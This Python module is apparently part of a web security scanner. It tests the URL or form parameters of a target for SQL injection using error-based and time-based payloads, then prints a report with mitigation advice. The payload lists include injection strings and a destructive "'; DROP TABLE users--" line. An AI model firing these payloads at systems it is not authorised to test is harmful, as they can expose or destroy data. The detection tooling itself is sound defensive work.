#!/usr/bin/env python3
"""
SQL Injection detection module
Author: Jet
GitHub: https://github.com/JettRnh
"""

import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode
from core.logger import log
from core.utils import RateLimiter
from config.settings import DEFAULT_USER_AGENT, DEFAULT_REQUEST_TIMEOUT

class SQLInjection:
    """SQL injection vulnerability detector"""
    
    def __init__(self, target_url, method='GET', threads=10):
        self.target_url = target_url
        self.method = method.upper()
        self.threads = min(threads, 50)
        self.vulnerable = []
        self.rate_limiter = RateLimiter(20)
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': DEFAULT_USER_AGENT})
        
        # Parse URL and parameters
        self.base_url, self.params = self._parse_url(target_url)
        
        log.status(f"SQLInjection initialized for {target_url}")
        log.info(f"Method: {method}, Parameters: {list(self.params.keys())}")
    
    def _parse_url(self, url):
        """Parse URL and extract parameters"""
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        if parsed.query:
            params = parse_qs(parsed.query)
            # Convert list values to strings
            params = {k: v[0] if v else '' for k, v in params.items()}
        else:
            params = {}
        
        return base, params
    
    def _test_payload(self, param, original_value, payload):
        """Test a single payload on a parameter"""
        test_value = original_value + payload
        
        # Prepare request
        if self.method == 'GET':
            test_params = self.params.copy()
            test_params[param] = test_value
            url = f"{self.base_url}?{urlencode(test_params)}"
            
            try:
                with self.rate_limiter:
                    response = self.session.get(
                        url,
                        timeout=DEFAULT_REQUEST_TIMEOUT,
                        verify=False
                    )
                return response
            
            except Exception as e:
                log.debug(f"Request error: {e}")
                return None
        
        elif self.method == 'POST':
            test_data = self.params.copy()
            test_data[param] = test_value
            
            try:
                with self.rate_limiter:
                    response = self.session.post(
                        self.target_url,
                        data=test_data,
                        timeout=DEFAULT_REQUEST_TIMEOUT,
                        verify=False
                    )
                return response
            
            except Exception as e:
                log.debug(f"Request error: {e}")
                return None
        
        return None
    
    def _detect_error_based(self, response):
        """Detect SQL injection based on error messages"""
        error_patterns = [
            'sql', 'mysql', 'syntax error', 'unclosed quotation',
            'odbc', 'driver', 'oracle', 'postgres', 'sqlite',
            'microsoft ole db', 'jdbc', 'db2', 'mariadb'
        ]
        
        if response and response.text:
            text_lower = response.text.lower()
            for pattern in error_patterns:
                if pattern in text_lower:
                    return True
        return False
    
    def _detect_time_based(self, param, original_value, payload, delay=5):
        """Detect SQL injection based on time delay"""
        test_value = original_value + payload
        
        if self.method == 'GET':
            test_params = self.params.copy()
            test_params[param] = test_value
            url = f"{self.base_url}?{urlencode(test_params)}"
            
            try:
                start = time.time()
                self.session.get(url, timeout=delay + 5, verify=False)
                elapsed = time.time() - start
                return elapsed >= delay
            except:
                return False
        
        return False
    
    def scan(self, error_based=True, time_based=True):
        """Scan for SQL injection vulnerabilities"""
        log.progress(f"Scanning for SQL injection on {self.target_url}")
        
        # Common SQL injection payloads
        error_payloads = [
            "'",
            '"',
            "';",
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "'; DROP TABLE users--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' UNION SELECT NULL--",
            "1' ORDER BY 1--",
            "1' WAITFOR DELAY '0:0:5'--"
        ]
        
        time_payloads = [
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "1' AND SLEEP(5)--",
            "1' OR SLEEP(5)--",
            "' AND pg_sleep(5)--",
            "1' AND pg_sleep(5)--"
        ]
        
        for param, original_value in self.params.items():
            log.info(f"Testing parameter: {param}")
            
            # Error-based detection
            if error_based:
                for payload in error_payloads:
                    response = self._test_payload(param, original_value, payload)
                    if self._detect_error_based(response):
                        self.vulnerable.append({
                            'parameter': param,
                            'payload': payload,
                            'type': 'error-based',
                            'severity': 'high'
                        })
                        log.success(f"Error-based SQL injection found on {param} with payload: {payload}")
                        break
            
            # Time-based detection
            if time_based:
                for payload in time_payloads:
                    if self._detect_time_based(param, original_value, payload):
                        self.vulnerable.append({
                            'parameter': param,
                            'payload': payload,
                            'type': 'time-based',
                            'severity': 'high'
                        })
                        log.success(f"Time-based SQL injection found on {param} with payload: {payload}")
                        break
        
        if self.vulnerable:
            log.success(f"Found {len(self.vulnerable)} SQL injection vulnerabilities")
        else:
            log.info("No SQL injection vulnerabilities detected")
        
        return self.vulnerable
    
    def get_report(self):
        """Generate scan report"""
        lines = []
        lines.append("\n" + "=" * 70)
        lines.append("SQL INJECTION SCAN REPORT")
        lines.append("=" * 70)
        lines.append(f"Target: {self.target_url}")
        lines.append(f"Method: {self.method}")
        lines.append(f"Parameters Tested: {len(self.params)}")
        lines.append(f"Vulnerabilities Found: {len(self.vulnerable)}")
        lines.append("=" * 70)
        
        if self.vulnerable:
            lines.append("\n[VULNERABLE PARAMETERS]")
            lines.append("-" * 40)
            for vuln in self.vulnerable:
                lines.append(f"Parameter: {vuln['parameter']}")
                lines.append(f"Type: {vuln['type']}")
                lines.append(f"Payload: {vuln['payload']}")
                lines.append(f"Severity: {vuln['severity']}")
                lines.append("-" * 40)
            
            lines.append("\n[MITIGATION RECOMMENDATIONS]")
            lines.append("-" * 40)
            lines.append("1. Use parameterized queries/prepared statements")
            lines.append("2. Validate and sanitize all user inputs")
            lines.append("3. Use stored procedures")
            lines.append("4. Apply least privilege principle to database accounts")
            lines.append("5. Use a Web Application Firewall (WAF)")
        else:
            lines.append("\nNo SQL injection vulnerabilities detected")
        
        lines.append("\n" + "=" * 70)
        return "\n".join(lines)
